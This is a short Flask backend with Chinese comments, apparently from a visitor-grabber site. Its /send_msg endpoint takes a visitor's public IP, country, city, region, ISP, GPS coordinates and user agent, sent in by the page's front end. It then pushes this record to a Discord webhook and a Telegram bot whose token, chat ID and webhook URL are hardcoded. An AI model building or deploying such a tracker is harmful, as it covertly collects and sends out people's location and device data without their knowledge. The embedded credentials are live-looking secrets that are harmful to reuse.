from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# 私密配置，只写在后端，前端完全看不到
TG_TOKEN = "8831992575:AAFPvDrXc_kEiOiT0XHYgJj9E8KSWwR-aBo"
TG_CHATID = "7763890817"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1534727827717488710/LLyLVdQiCLWMMX0Uu2TWis66L3DPmvo6Fu05XXKaEwA8Hgp2uSD8F5-B1_uhpZ5frQX4"

# 主页路由，加载前端页面
@app.route('/')
def index():
    with open("index.html","r",encoding="utf-8") as f:
        html = f.read()
    return html

# 接口：接收前端传过来的访客数据，后端执行推送
@app.route("/send_msg",methods=["POST"])
def send_msg():
    data = request.get_json()
    content = f"""【第四代完整版访客采集记录】
公网IP：{data['ip']}
所属国家：{data['country']}
城市：{data['city']}
行政区：{data['region']}
网络运营商：{data['isp']}
GPS经纬度：{data['gps']}
设备UA标识：{data['ua']}"""

    #推送到Discord
    requests.post(DISCORD_WEBHOOK,json={"content":content})
    #推送到Telegram
    requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                  json={"chat_id":TG_CHATID,"text":content})
    return jsonify({"code":200,"msg":"发送成功"})

if __name__ == "__main__":
    app.run(host="0.0.0.0")
